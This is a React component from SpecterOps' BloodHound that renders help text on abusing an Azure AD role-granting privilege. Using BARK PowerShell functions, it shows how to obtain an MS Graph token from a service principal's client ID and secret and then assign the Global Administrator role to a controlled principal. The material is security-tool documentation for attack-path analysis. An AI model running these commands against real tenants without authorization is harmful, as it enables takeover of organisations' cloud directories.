// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { FC } from 'react';
import { Typography } from '@mui/material';

const Abuse: FC = () => {
    return (
        <>
            <Typography variant='body2'>
                To abuse this privilege, you can promote a principal you control to Global Administrator using BARK's
                New-AzureADRoleAssignment.
            </Typography>

            <Typography variant='body2'>
                This function requires you to supply an MS Graph-scoped JWT associated with the Service Principal that
                has the privilege to grant AzureAD admin roles. There are several ways to acquire a JWT. For example,
                you may use BARK’s Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT by supplying
                a Service Principal Client ID and secret:
            </Typography>

            <Typography component={'pre'}>
                {`$MGToken = Get-MSGraphTokenWithClientCredentials \`
    -ClientID "34c7f844-b6d7-47f3-b1b8-720e0ecba49c" \`
    -ClientSecret "asdf..." \`
    -TenantName "contoso.onmicrosoft.com"`}
            </Typography>

            <Typography variant='body2'>
                Then use BARK's New-AzureADRoleAssignment function to grant the AzureAD role to your target principal:
            </Typography>

            <Typography component={'pre'}>
                {`New-AzureADRoleAssignment \`
    -PrincipalID "6b6f9289-fe92-4930-a331-9575e0a4c1d8" \`
    -RoleDefinitionId "62e90394-69f5-4237-9190-012177145e10" \`
    -Token $MGToken`}
            </Typography>

            <Typography variant='body2'>
                If successful, the output will include the principal ID, the role ID, and a unique ID for the role
                assignment.
            </Typography>
        </>
    );
};

export default Abuse;
